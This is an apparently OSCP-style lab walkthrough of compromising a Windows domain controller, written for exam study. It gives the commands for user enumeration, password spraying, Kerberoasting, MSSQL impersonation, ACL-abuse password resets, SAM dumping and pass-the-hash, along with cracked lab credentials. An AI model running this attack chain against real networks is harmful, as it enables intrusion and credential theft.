
# 🔴 0. PORT SCAN — WHY IT MATTERS

### You saw ports:

53, 88, 389, 445, 1433, 3389, 5985...

## 🧠 Meaning:

- 88 → Kerberos → AD present
- 389 → LDAP → Domain queries
- 445 → SMB → shares / auth
- 1433 → MSSQL → potential entry point
- 3389 → RDP → GUI access
- 5985 → WinRM → remote shell

👉 **Conclusion:**  
✔ This is a **Domain Controller with MSSQL**

---

# 🔴 1. ENUMERATION FAILED → CHANGE STRATEGY

### Tried:

- smb
- ldap
- enum4linux

### ❌ Nothing useful

## 🧠 Why switch to kerbrute?

Because:

> “If services don’t leak info → enumerate USERS first”

---

# 🔴 2. USER ENUMERATION (KERBRUTE)

kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.208.40 users.txt

## 🧠 Why this works:

Kerberos gives **different responses** for:

- valid user ✅
- invalid user ❌

👉 So you discovered:

info  
administrator  
discovery  
maintenance

✔ This is **foundation for all attacks**

---

# 🔴 3. PASSWORD SPRAYING

### Created password list:

Winter2023, Summer2023, info, discovery, etc.

## 🧠 Why?

Because:

- Users often use:
    - Season-based passwords
    - Username-based passwords

---

### Command:

crackmapexec smb IP -u users.txt -p pass.txt

## 🧠 What it does:

- Tries login across SMB
- Finds valid credentials

---

### ✅ Result:

info : info

👉 First foothold credential

---

# 🔴 4. SMB SHARE ENUMERATION

crackmapexec smb IP --shares -u info -p info

## 🧠 Why?

After creds:

> “Check what files you can access”

---

### Found:

- `NETLOGON`
- `Homes`

---

## 🔴 CRITICAL FIND:

📄 `password_reset.txt`

Initial Password: Start123!

## 🧠 Meaning:

- Likely default password used by admins
- Try with all users

---

# 🔴 5. PASSWORD REUSE ATTACK

crackmapexec smb IP -u users.txt -p Start123!

### ✅ Result:

discovery : Start123!

## 🧠 Why this works:

Admins reuse passwords across accounts.

---

# 🔴 6. FAILED WINRM → THINK DIFFERENT

### Tried:

evil-winrm

❌ Failed

## 🧠 Meaning:

- User not allowed WinRM
- Need another entry point

---

# 🔴 7. KERBEROASTING

impacket-GetUserSPNs domain/discovery:Start123! -request

## 🧠 Why?

Now you have creds → look for:

> “Service accounts with SPN”

---

### Found:

- discovery
- maintenance

## 🧠 Why crack maintenance?

Service accounts often have:  
✔ Weak passwords  
✔ High privileges

❌ But hash didn’t crack → move on

---

# 🔴 8. MSSQL ACCESS (SMART MOVE)

impacket-mssqlclient domain/discovery:Start123!@IP -windows-auth

## 🧠 Why try MSSQL?

Because:

- Port 1433 open
- You have domain creds

👉 Always try services with creds

---

# 🔴 9. DATABASE ENUMERATION

SELECT name FROM master..sysdatabases;

### Found:

hrappdb

## 🧠 Why interesting?

“HR database = likely credentials”

---

### Access denied:

discovery cannot access hrappdb

👉 So next step:

---

# 🔴 10. IMPERSONATION ABUSE

SELECT ... WHERE permission_name = 'IMPERSONATE'

### Found:

hrappdb-reader

## 🧠 Meaning:

You can **become another user**

---

### Switch user:

EXECUTE AS LOGIN = 'hrappdb-reader'

✔ Now access granted

---

# 🔴 11. DATABASE CREDENTIAL DUMP

SELECT * FROM sysauth;

### Found:

hrapp-service : Untimed$Runny

## 🧠 Classic OSCP pattern:

👉 Databases often store credentials

---

# 🔴 12. BLOODHOUND ENUMERATION

bloodhound-python -u hrapp-service -p 'Untimed$Runny'

## 🧠 Why now?

You have better creds → map AD relationships

---

### Found:

hrapp-service → GenericWrite → Hazel.Green

## 🧠 Meaning:

You can **control Hazel.Green account**

---

# 🔴 13. TARGETED KERBEROASTING

targetedKerberoast.py ...

## 🧠 Why?

Instead of waiting:  
👉 Force SPN → get hash

---

### Crack result:

hazel.green : haze1988

---

# 🔴 14. ACL ABUSE (VERY IMPORTANT)

Hazel.Green is:  
✔ Tier2 admin  
✔ Member of IT group

---

## Attack:

rpcclient -U hazel.green  
setuserinfo2 MOLLY.SMITH 23 'Password123!'

## 🧠 Meaning:

You changed another user’s password

👉 This is **ACL abuse**

---

# 🔴 15. RDP ACCESS

xfreerdp /u:molly.smith /p:'Password123!'

✔ GUI access

---

# 🔴 16. PRIVILEGE ESCALATION

whoami /priv

### Found:

SeBackupPrivilege

## 🧠 Meaning:

You can read sensitive files

---

# 🔴 17. SAM & SYSTEM DUMP

reg save hklm\sam c:\Temp\sam  
reg save hklm\system c:\Temp\system

## 🧠 Why?

These contain:  
✔ Password hashes

---

# 🔴 18. OFFLINE HASH DUMP

impacket-secretsdump -system system -sam sam local

### Found:

Administrator hash

---

# 🔴 19. PASS-THE-HASH

evil-winrm -u administrator -H HASH

💥 DOMAIN ADMIN ACCESS

---

# 🧠 🔥 FULL ATTACK CHAIN (IMPORTANT)

---

## 🔗 Chain:

1. Kerbrute → users
2. Password spray → creds
3. SMB → password file
4. Password reuse → new creds
5. MSSQL → entry
6. Impersonation → DB access
7. DB → creds
8. BloodHound → attack path
9. ACL abuse → password reset
10. RDP → access
11. SeBackupPrivilege → dump SAM
12. Pass-the-Hash → admin

---

# ⚠️ WHY THIS BOX IS GOLD FOR OSCP

This box teaches:

✔ Password spraying  
✔ Kerberoasting  
✔ MSSQL abuse  
✔ AD ACL abuse  
✔ BloodHound usage  
✔ Privilege escalation (SeBackupPrivilege)  
✔ Pass-the-Hash

---

# 🚀 KEY TAKEAWAYS (MEMORIZE)

---

## 🧠 Patterns:

### Pattern 1:

SMB → file → password → reuse

### Pattern 2:

MSSQL → impersonation → database → creds

### Pattern 3:

BloodHound → ACL → password reset

### Pattern 4:

Privilege → dump SAM → PTH